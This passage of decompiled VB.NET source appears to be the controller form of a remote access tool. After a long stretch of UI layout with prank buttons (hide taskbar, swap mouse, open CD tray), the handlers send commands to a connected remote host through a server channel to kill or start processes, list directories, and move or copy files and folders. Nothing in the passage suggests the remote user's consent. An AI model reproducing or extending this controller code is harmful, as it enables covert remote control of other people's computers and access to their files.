            point2 = New Point(&HB8, &HC0)
            Me.btn_openweb.Location = point2
            Me.btn_openweb.Name = "btn_openweb"
            Me.btn_openweb.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_openweb.Size = size2
            Me.btn_openweb.TabIndex = 9
            Me.btn_openweb.Text = "Open Website"
            Me.btn_openweb.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_speak.BackColor = Color.Transparent
            Me.btn_speak.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_speak.Cursor = Cursors.Hand
            Me.btn_speak.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &HC0)
            Me.btn_speak.Location = point2
            Me.btn_speak.Name = "btn_speak"
            Me.btn_speak.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_speak.Size = size2
            Me.btn_speak.TabIndex = 8
            Me.btn_speak.Text = "Speak Text"
            Me.btn_speak.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_undo.BackColor = Color.Transparent
            Me.btn_undo.BaseColor = Color.DeepPink
            Me.btn_undo.Cursor = Cursors.Hand
            Me.btn_undo.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB8, &H9A)
            Me.btn_undo.Location = point2
            Me.btn_undo.Name = "btn_undo"
            Me.btn_undo.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_undo.Size = size2
            Me.btn_undo.TabIndex = 7
            Me.btn_undo.Text = "Undo Mouse"
            Me.btn_undo.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_swap.BackColor = Color.Transparent
            Me.btn_swap.BaseColor = Color.DeepPink
            Me.btn_swap.Cursor = Cursors.Hand
            Me.btn_swap.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &H9A)
            Me.btn_swap.Location = point2
            Me.btn_swap.Name = "btn_swap"
            Me.btn_swap.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_swap.Size = size2
            Me.btn_swap.TabIndex = 6
            Me.btn_swap.Text = "Swap Mouse"
            Me.btn_swap.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_closecd.BackColor = Color.Transparent
            Me.btn_closecd.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_closecd.Cursor = Cursors.Hand
            Me.btn_closecd.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB8, &H74)
            Me.btn_closecd.Location = point2
            Me.btn_closecd.Name = "btn_closecd"
            Me.btn_closecd.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_closecd.Size = size2
            Me.btn_closecd.TabIndex = 5
            Me.btn_closecd.Text = "Close CD Tray"
            Me.btn_closecd.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_opencd.BackColor = Color.Transparent
            Me.btn_opencd.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_opencd.Cursor = Cursors.Hand
            Me.btn_opencd.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &H74)
            Me.btn_opencd.Location = point2
            Me.btn_opencd.Name = "btn_opencd"
            Me.btn_opencd.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_opencd.Size = size2
            Me.btn_opencd.TabIndex = 4
            Me.btn_opencd.Text = "Open CD Tray"
            Me.btn_opencd.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_showdi.BackColor = Color.Transparent
            Me.btn_showdi.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_showdi.Cursor = Cursors.Hand
            Me.btn_showdi.Font = New Font("Segoe UI", 12!)
            Me.btn_showdi.ForeColor = Color.Black
            point2 = New Point(&HB9, &H4E)
            Me.btn_showdi.Location = point2
            Me.btn_showdi.Name = "btn_showdi"
            Me.btn_showdi.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_showdi.Size = size2
            Me.btn_showdi.TabIndex = 3
            Me.btn_showdi.Text = "Show Desktop Icons"
            Me.btn_showdi.TextColor = Color.White
            Me.btn_hidedi.BackColor = Color.Transparent
            Me.btn_hidedi.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_hidedi.Cursor = Cursors.Hand
            Me.btn_hidedi.Font = New Font("Segoe UI", 12!)
            Me.btn_hidedi.ForeColor = Color.Black
            point2 = New Point(&H13, &H4E)
            Me.btn_hidedi.Location = point2
            Me.btn_hidedi.Name = "btn_hidedi"
            Me.btn_hidedi.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_hidedi.Size = size2
            Me.btn_hidedi.TabIndex = 2
            Me.btn_hidedi.Text = "Hide Desktop Icons"
            Me.btn_hidedi.TextColor = Color.White
            Me.btn_showtb.BackColor = Color.Transparent
            Me.btn_showtb.BaseColor = Color.DeepPink
            Me.btn_showtb.Cursor = Cursors.Hand
            Me.btn_showtb.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HB9, 40)
            Me.btn_showtb.Location = point2
            Me.btn_showtb.Name = "btn_showtb"
            Me.btn_showtb.Rounded = False
            size2 = New Size(&H9B, &H20)
            Me.btn_showtb.Size = size2
            Me.btn_showtb.TabIndex = 1
            Me.btn_showtb.Text = "Show Taskbar"
            Me.btn_showtb.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_hidetb.BackColor = Color.Transparent
            Me.btn_hidetb.BaseColor = Color.DeepPink
            Me.btn_hidetb.Cursor = Cursors.Hand
            Me.btn_hidetb.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, 40)
            Me.btn_hidetb.Location = point2
            Me.btn_hidetb.Name = "btn_hidetb"
            Me.btn_hidetb.Rounded = False
            size2 = New Size(&H9F, &H20)
            Me.btn_hidetb.Size = size2
            Me.btn_hidetb.TabIndex = 0
            Me.btn_hidetb.Text = "Hide Taskbar"
            Me.btn_hidetb.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.TabPage4.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage4.Controls.Add(Me.FlatStatusBar_IS)
            Me.TabPage4.Controls.Add(Me.ListBox_Software)
            point2 = New Point(140, 4)
            Me.TabPage4.Location = point2
            Me.TabPage4.Name = "TabPage4"
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage4.Size = size2
            Me.TabPage4.TabIndex = 3
            Me.TabPage4.Text = "Installed Softwares"
            Me.FlatStatusBar_IS.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar_IS.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar_IS.ForeColor = Color.White
            point2 = New Point(0, &H15A)
            Me.FlatStatusBar_IS.Location = point2
            Me.FlatStatusBar_IS.Name = "FlatStatusBar_IS"
            Me.FlatStatusBar_IS.RectColor = Color.DeepPink
            Me.FlatStatusBar_IS.ShowTimeDate = False
            size2 = New Size(&H2B9, 20)
            Me.FlatStatusBar_IS.Size = size2
            Me.FlatStatusBar_IS.TabIndex = 1
            Me.FlatStatusBar_IS.Text = "Idle"
            Me.FlatStatusBar_IS.TextColor = Color.White
            Me.ListBox_Software.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListBox_Software.ContextMenuStrip = Me.rightclick_IS
            Me.ListBox_Software.ForeColor = Color.White
            Me.ListBox_Software.FormattingEnabled = True
            Me.ListBox_Software.ItemHeight = &H15
            point2 = New Point(3, 3)
            Me.ListBox_Software.Location = point2
            Me.ListBox_Software.Name = "ListBox_Software"
            size2 = New Size(&H2B3, 340)
            Me.ListBox_Software.Size = size2
            Me.ListBox_Software.TabIndex = 0
            Me.TabPage5.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage5.Controls.Add(Me.tb_path)
            Me.TabPage5.Controls.Add(Me.ListView1)
            Me.TabPage5.Controls.Add(Me.PictureBox1)
            Me.TabPage5.Controls.Add(Me.cb_drive)
            point2 = New Point(140, 4)
            Me.TabPage5.Location = point2
            Me.TabPage5.Name = "TabPage5"
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage5.Size = size2
            Me.TabPage5.TabIndex = 4
            Me.TabPage5.Text = "File Manager"
            Me.tb_path.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.tb_path.ForeColor = Color.White
            point2 = New Point(&H67, 9)
            Me.tb_path.Location = point2
            Me.tb_path.Name = "tb_path"
            size2 = New Size(&H223, &H1D)
            Me.tb_path.Size = size2
            Me.tb_path.TabIndex = 4
            Me.ListView1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8, Me.ColumnHeader9, Me.ColumnHeader10 })
            Me.ListView1.ContextMenuStrip = Me.rightclick_filemanagerfolders
            Me.ListView1.ForeColor = Color.White
            Me.ListView1.FullRowSelect = True
            Me.ListView1.GridLines = True
            point2 = New Point(15, &H2B)
            Me.ListView1.Location = point2
            Me.ListView1.Name = "ListView1"
            size2 = New Size(&H2A0, &H137)
            Me.ListView1.Size = size2
            Me.ListView1.SmallImageList = Me.ImageList_FileManager
            Me.ListView1.TabIndex = 3
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ColumnHeader6.Text = "Files"
            Me.ColumnHeader6.Width = &HFE
            Me.ColumnHeader7.Text = "Creation Time"
            Me.ColumnHeader7.Width = 160
            Me.ColumnHeader8.Text = "Last Access Time"
            Me.ColumnHeader8.Width = 160
            Me.ColumnHeader9.Text = "Size"
            Me.ColumnHeader9.Width = &H49
            Me.ColumnHeader10.Text = ""
            Me.ColumnHeader10.Width = 0
            Me.PictureBox1.Image = DirectCast(manager.GetObject("PictureBox1.Image"), Image)
            point2 = New Point(&H290, 8)
            Me.PictureBox1.Location = point2
            Me.PictureBox1.Name = "PictureBox1"
            size2 = New Size(&H1F, &H1D)
            Me.PictureBox1.Size = size2
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 2
            Me.PictureBox1.TabStop = False
            Me.cb_drive.BackColor = Color.FromArgb(&H2D, &H2D, &H30)
            Me.cb_drive.Cursor = Cursors.Hand
            Me.cb_drive.DrawMode = DrawMode.OwnerDrawFixed
            Me.cb_drive.DropDownStyle = ComboBoxStyle.DropDownList
            Me.cb_drive.Font = New Font("Segoe UI", 8!)
            Me.cb_drive.ForeColor = Color.White
            Me.cb_drive.FormattingEnabled = True
            Me.cb_drive.HoverColor = Color.DeepPink
            Me.cb_drive.ItemHeight = &H12
            point2 = New Point(15, 13)
            Me.cb_drive.Location = point2
            Me.cb_drive.Name = "cb_drive"
            size2 = New Size(&H52, &H18)
            Me.cb_drive.Size = size2
            Me.cb_drive.TabIndex = 0
            Me.TabPage6.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage6.Controls.Add(Me.Label1)
            point2 = New Point(140, 4)
            Me.TabPage6.Location = point2
            Me.TabPage6.Name = "TabPage6"
            size2 = New Size(&H2B9, &H16E)
            Me.TabPage6.Size = size2
            Me.TabPage6.TabIndex = 5
            Me.TabPage6.Text = "Registry Manager"
            Me.Label1.AutoSize = True
            Me.Label1.Font = New Font("Segoe UI", 40!)
            Me.Label1.ForeColor = Color.White
            point2 = New Point(&HA2, &H93)
            Me.Label1.Location = point2
            Me.Label1.Name = "Label1"
            size2 = New Size(&H174, &H48)
            Me.Label1.Size = size2
            Me.Label1.TabIndex = 0
            Me.Label1.Text = "Coming Soon!"
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H2FB, 13)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 2
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H313, 13)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 1
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseSY1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseSY1.BackColor = Color.White
            Me.FlatCloseSY1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseSY1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H32B, 13)
            Me.FlatCloseSY1.Location = point2
            Me.FlatCloseSY1.Name = "FlatCloseSY1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseSY1.Size = size2
            Me.FlatCloseSY1.TabIndex = 0
            Me.FlatCloseSY1.Text = "FlatCloseSY1"
            Me.FlatCloseSY1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H349, &H1BD)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "SystemInformation"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "SystemInformation"
            Me.TransparencyKey = Color.Fuchsia
            Me.rightclickprocess.ResumeLayout(False)
            Me.rightclicksystem.ResumeLayout(False)
            Me.rightclick_IS.ResumeLayout(False)
            Me.rightclick_filemanagerfolders.ResumeLayout(False)
            Me.rightclick_filemanagerfiles.ResumeLayout(False)
            Me.rightclick_nothing.ResumeLayout(False)
            Me.FormSkin1.ResumeLayout(False)
            Me.DotNetBarTabcontrol1.ResumeLayout(False)
            Me.TabPage1.ResumeLayout(False)
            Me.TabPage2.ResumeLayout(False)
            Me.TabPage3.ResumeLayout(False)
            Me.FlatGroupBox2.ResumeLayout(False)
            Me.FlatGroupBox2.PerformLayout
            Me.FlatGroupBox1.ResumeLayout(False)
            Me.TabPage4.ResumeLayout(False)
            Me.TabPage5.ResumeLayout(False)
            Me.TabPage5.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.TabPage6.ResumeLayout(False)
            Me.TabPage6.PerformLayout
            Me.ResumeLayout(False)
        End Sub

        Private Sub KillProcessToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Kill:" & Me.listprocess.SelectedItems.Item(0).Text), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.FlatStatusBar1.Text = "Process killed!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ListView1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                    Me.ListView1.ContextMenuStrip = Me.rightclick_filemanagerfolders
                ElseIf (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "0") Then
                    Me.ListView1.ContextMenuStrip = Me.rightclick_filemanagerfiles
                Else
                    Me.ListView1.ContextMenuStrip = Me.rightclick_nothing
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                If (Me.ListView1.SelectedItems.Item(0).Text = "[...]") Then
                    Dim num As Integer = MyProject.Forms.Form1.CountCharacter(Me.tb_path.Text, "\"c)
                    Dim text As String = Me.tb_path.Text
                    Dim str5 As String = Conversions.ToString(Operators.ConcatenateObject(Me.cb_drive.SelectedItem, [text].Replace(([text].Split(New Char() { "\"c })((num - 1)) & "\"), "")))
                    Me.ListView1.Items.Clear
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Getfiles|" & str5), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    End If
                    Me.url = (host & "/" & file & "_files.txt")
                    Me.ListView1.Items.Add("[...]", &H17)
                    Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                    Me.f.Start
                    Me.FlatStatusBar1.Text = "Directory received successfully!"
                End If
                Dim str As String = (Me.path & Me.ListView1.SelectedItems.Item(0).Text & "\")
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Getfiles|" & str), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                Me.ListView1.Items.Add("[...]", &H17)
                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory received successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Function MessageBoxButton(ByVal [Text] As String) As Object
            Select Case [Text]
                Case "AbortRetryIgnore"
                    Return MessageBoxButtons.AbortRetryIgnore
                Case "OK"
                    Return MessageBoxButtons.OK
                Case "OKCancel"
                    Return MessageBoxButtons.OKCancel
                Case "RetryCancel"
                    Return MessageBoxButtons.RetryCancel
                Case "YesNo"
                    Return MessageBoxButtons.YesNo
                Case "YesNoCancel"
                    Return MessageBoxButtons.YesNoCancel
            End Select
            Return MessageBoxButtons.OK
        End Function

        Public Function MessageBoxIcn(ByVal [text] As String) As Object
            Select Case [text]
                Case "Asterisk"
                    Return MessageBoxIcon.Asterisk
                Case "Error"
                    Return MessageBoxIcon.Hand
                Case "Exclamation"
                    Return MessageBoxIcon.Exclamation
                Case "Hand"
                    Return MessageBoxIcon.Hand
                Case "Information"
                    Return MessageBoxIcon.Asterisk
                Case "None"
                    Return MessageBoxIcon.None
                Case "Question"
                    Return MessageBoxIcon.Question
                Case "Stop"
                    Return MessageBoxIcon.Hand
                Case "Warning"
                    Return MessageBoxIcon.Exclamation
            End Select
            Return MessageBoxIcon.None
        End Function

        Public Sub MoveFileHere()
            Try 
                Dim path As String
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text & "\")
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "movefile|", Me.oldpath, "|", path, "|", Me.nam }), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "File was moved successfully!"
                End If
                Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
                Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
                Me.rightclick_nothing.Items.RemoveByKey("Move3f")
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub MoveFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                    Interaction.MsgBox("Please select a File!", MsgBoxStyle.Critical, Nothing)
                Else
                    Me.oldpath = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Me.nam = Me.ListView1.SelectedItems.Item(0).Text
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
                    Me.rightclick_nothing.Items.RemoveByKey("Copy3f")
                    Me.rightclick_nothing.Items.RemoveByKey("Move3f")
                    Dim item As New ToolStripMenuItem("Move File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Move1f" _
                    }
                    Me.rightclick_filemanagerfolders.Items.Add(item)
                    AddHandler item.Click, New EventHandler(AddressOf Me._Lambda$__12)
                    Dim item2 As New ToolStripMenuItem("Move File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Move2f" _
                    }
                    Me.rightclick_filemanagerfiles.Items.Add(item2)
                    AddHandler item2.Click, New EventHandler(AddressOf Me._Lambda$__13)
                    Dim item3 As New ToolStripMenuItem("Move File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Move2f" _
                    }
                    Me.rightclick_nothing.Items.Add(item3)
                    AddHandler item3.Click, New EventHandler(AddressOf Me._Lambda$__14)
                    Me.FlatStatusBar1.Text = "Moving File..."
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub MoveHereItem_Click()
            Try 
                Dim path As String
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "mvdir|", Me.oldpath, "\|", path, "\|", Me.nam }), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Directory was moved successfully!"
                End If
                Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
                Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
                Me.rightclick_nothing.Items.RemoveByKey("Move3")
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub MoveThisFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "0") Then
                    Interaction.MsgBox("Please select a Folder!", MsgBoxStyle.Critical, Nothing)
                Else
                    Me.oldpath = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Me.nam = Me.ListView1.SelectedItems.Item(0).Text
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
                    Me.rightclick_nothing.Items.RemoveByKey("Copy3")
                    Me.rightclick_nothing.Items.RemoveByKey("Move3")
                    Dim item As New ToolStripMenuItem("Move Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Move1" _
                    }
                    Me.rightclick_filemanagerfolders.Items.Add(item)
                    AddHandler item.Click, New EventHandler(AddressOf Me._Lambda$__6)
                    Dim item2 As New ToolStripMenuItem("Move Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Move2" _
                    }
                    Me.rightclick_filemanagerfiles.Items.Add(item2)
                    AddHandler item2.Click, New EventHandler(AddressOf Me._Lambda$__7)
                    Dim item3 As New ToolStripMenuItem("Move Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Move2" _
                    }
                    Me.rightclick_nothing.Items.Add(item3)
                    AddHandler item3.Click, New EventHandler(AddressOf Me._Lambda$__8)
                    Me.FlatStatusBar1.Text = "Moving Directory..."
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub NewProcessToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("New:" & Interaction.InputBox("Process-name to start", "New Process", "", -1, -1)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.FlatStatusBar1.Text = "New process started!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub PasteFileHere()
            Try 
                Dim path As String
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text & "\")
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "copyfile|", Me.oldpath, "|", path, "|", Me.nam }), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "File was copied successfully!"
                End If
                Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
                Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
                Me.rightclick_nothing.Items.RemoveByKey("Copy3f")
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub PasteHereItem_Click()
            Try 
                Dim path As String
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "cpdir|", Me.oldpath, "\|", path, "\|", Me.nam }), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Directory was copied successfully!"
                End If
                Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
                Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
                Me.rightclick_nothing.Items.RemoveByKey("Copy3")
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub PictureBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Getfiles|", Me.cb_drive.SelectedItem), Me.tb_path.Text)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                If (Me.tb_path.Text <> "") Then
                    Me.ListView1.Items.Add("[...]", &H17)
                End If
